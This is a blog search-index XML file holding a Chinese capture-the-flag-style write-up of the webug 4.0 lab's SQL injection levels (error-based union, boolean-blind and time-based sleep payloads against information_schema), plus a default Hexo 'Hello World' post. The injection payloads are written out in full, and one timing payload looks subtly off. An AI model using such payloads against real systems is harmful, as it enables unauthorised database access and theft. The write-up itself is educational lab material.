<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>webug4.0通关笔记-注入之sql注入</title>
      <link href="/2019/03/17/1/"/>
      <url>/2019/03/17/1/</url>
      
        <content type="html"><![CDATA[<h2 id="webug-是什么"><a href="#webug-是什么" class="headerlink" title="webug 是什么"></a>webug 是什么</h2><p>WeBug名称定义为“我们的漏洞”靶场环境基础环境是基于PHP/mysql制作搭建而成，中级环境与高级环境分别都是由互联网漏洞事件而收集的漏洞存在的操作环境。部分漏洞是基于Windows操作系统的漏洞所以将WeBug的web环境都装在了一个纯净版的Windows 2003的虚拟机中。</p><p>本平台4.0为测试版本，主要分两大类<br>1.练习阶段，适合新手朋友们去了解一些漏洞，在环境中也包括有一些逻辑漏洞。</p><p>2.本平台实战阶段内容均为网上存在漏洞的开源cms，可以很好地帮助新手朋友去对漏洞进行了解~ </p><p>3.自我感觉，webug4.0与其他靶场相比，突出了一个真实，适合了解一定漏洞原理，苦于无法实现的小白实现，比如说我。所以基础知识不会讲太多，主要是通关的思路。</p><p>来源：226安全团队</p><p>[官网]（<a href="http://www.webug.org" target="_blank" rel="noopener">http://www.webug.org</a>)<br><a id="more"></a></p><h2 id="靶场"><a href="#靶场" class="headerlink" title="靶场"></a>靶场</h2><h3 id="显错注入"><a href="#显错注入" class="headerlink" title="显错注入"></a>显错注入</h3><p>常规测试在单引号后面加上单引号’</p><p>结果如下所示</p><p><img src="/2019/03/17/1/图片1.png" alt="图1"></p><p><img src="/2019/03/17/1/图片2.png" alt="图2"></p><p>ok，下面开始正戏</p><h4 id="首先猜字段"><a href="#首先猜字段" class="headerlink" title="首先猜字段"></a>首先猜字段</h4><p><img src="/2019/03/17/1/图片3.png" alt="图3"></p><p>继续尝试，当order by 3时，页面报错，所以可知字段数是2</p><p>并且只有第二个字段处内容可以显示在界面上，所以此处利用第二个字段获取想要的信息</p><h4 id="首先获取数据库名"><a href="#首先获取数据库名" class="headerlink" title="首先获取数据库名"></a>首先获取数据库名</h4><p><img src="/2019/03/17/1/图片4.png" alt="图4"></p><h4 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h4><p><img src="/2019/03/17/1/图片2.png" alt="图5"></p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&apos;webug&apos;)--+</span><br></pre></td></tr></table></figure><h4 id="获取flag表的字段数"><a href="#获取flag表的字段数" class="headerlink" title="获取flag表的字段数"></a>获取flag表的字段数</h4><p><img src="/2019/03/17/1/图片6.png" alt="图6"></p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&apos;flag&apos;)--+</span><br></pre></td></tr></table></figure><h4 id="获取flag值"><a href="#获取flag值" class="headerlink" title="获取flag值"></a>获取flag值</h4><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; union select 1,flag from flag where id=1--+</span><br></pre></td></tr></table></figure><h3 id="布尔注入"><a href="#布尔注入" class="headerlink" title="布尔注入"></a>布尔注入</h3><p>继续常规测试，在id参数后加单引号，发现页面并没有报错，但是页面却有点变化</p><p><img src="/2019/03/17/1/图片7.png" alt="图7"></p><p><img src="/2019/03/17/1/图片8.png" alt="图8"></p><p>此处又尝试了双引号等，发现页面均正常显示，因此猜测id参数依然被单引号包裹，所以来验证一下</p><p><img src="/2019/03/17/1/图片9.png" alt="图9"></p><p>成了，因为此处页面并没有回显，也就是无法显示字段等内容，因此第一个靶场的union注入就无法使用，根据题目使用布尔注入。</p><h4 id="测数据库长度"><a href="#测数据库长度" class="headerlink" title="测数据库长度"></a>测数据库长度</h4><p><img src="/2019/03/17/1/图片13.png" alt="图13"></p><p><img src="/2019/03/17/1/图片14.png" alt="图14"></p><h4 id="测数据库名"><a href="#测数据库名" class="headerlink" title="测数据库名"></a>测数据库名</h4><p><img src="/2019/03/17/1/图片10.png" alt="图10"></p><p><img src="/2019/03/17/1/图片11.png" alt="图11"></p><p>因此得出数据库的第一个字符</p><p>以此类推，可以推出数据库的名字</p><p><img src="/2019/03/17/1/图片12.png" alt="图12"></p><h4 id="测表名"><a href="#测表名" class="headerlink" title="测表名"></a>测表名</h4><p><img src="/2019/03/17/1/图片15.png" alt="图15"></p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=&apos;webug&apos; limit 0,1),1,1))=108 --+</span><br></pre></td></tr></table></figure><p>这里的payload是为了测出webug下数据库，第一个表名的第一个字符，并且以ascii值为评判标准，之所以用ascii的形式是为了能用burp爆破，从而更加省事</p><p><img src="/2019/03/17/1/图片16.png" alt="图16"></p><p>这样我们就测出来了第一个表名的第一个字符是d，以此类推，改变limit n,1就可以测试出第n个表；改变substr(str,n,1)就可以测试某个表名第n个字符，这里不再演示，请读者自己尝试</p><h4 id="测字段"><a href="#测字段" class="headerlink" title="测字段"></a>测字段</h4><p>同猜测表名基本上是一样的步骤，直接上payload</p><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and ascii(substr((select column_name from information_schema.columns where table_schema=&apos;flag&apos; limit 0,1),1,1))=105 --+</span><br></pre></td></tr></table></figure><h4 id="获取flag"><a href="#获取flag" class="headerlink" title="获取flag"></a>获取flag</h4><p>同上面步骤</p><p>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and ascii(substr((select flag from flag where id=1),1,1))=68 --+</span><br></pre></td></tr></table></figure></p><h3 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h3><p>首先发现第三关和第二关代码是一样的，不知道是不是设计失误，还是我没下载好，但是发现确实是有两个html文件于是便稍微修改了一下</p><p>首先常规测试，测试’,”,’),”)等特殊符号，发现页面均无变化，结合题目的延时注入，分别测试如下payload</p><p>1”) and sleep(1)–+<br>1’) and sleep(1)–+<br>1) and sleep(1)–+<br>1” and sleep(1)–+<br>1’ and sleep(1)–+ 此时页面有明显延迟</p><p>所以判断出注入点，且注入点是被单引号包围的</p><p>其实之后的思路与上面两个靶场大同小异，只不过使用的方法以及函数有所不同</p><h4 id="测数据库长度-1"><a href="#测数据库长度-1" class="headerlink" title="测数据库长度"></a>测数据库长度</h4><p>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;and If(ascii(length(database()))=115,1,sleep(5))--+</span><br></pre></td></tr></table></figure></p><h4 id="测数据库名-1"><a href="#测数据库名-1" class="headerlink" title="测数据库名"></a>测数据库名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;and If(ascii(substr(database(),1,1))=115,1,sleep(5))--+</span><br></pre></td></tr></table></figure><p>以此类推</p><h4 id="测表名-1"><a href="#测表名-1" class="headerlink" title="测表名"></a>测表名</h4><p>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;and If(ascii(substr((select table_name from information_schema.tables where table_schema=&apos;webug&apos; limit 0,1),1,1))=115,1,sleep(5))--+</span><br></pre></td></tr></table></figure></p><h4 id="测字段-1"><a href="#测字段-1" class="headerlink" title="测字段"></a>测字段</h4><p>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos;and If(ascii(substr((select column_name from information_schema.columns where table_schema=&apos;flag&apos; limit 0,1),1,1))=115,1,sleep(5))--+</span><br></pre></td></tr></table></figure></p><h4 id="获取flag-1"><a href="#获取flag-1" class="headerlink" title="获取flag"></a>获取flag</h4><p>8写了，自己懂的</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶机练习 </tag>
            
            <tag> webug </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2019/02/12/hello-world/"/>
      <url>/2019/02/12/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
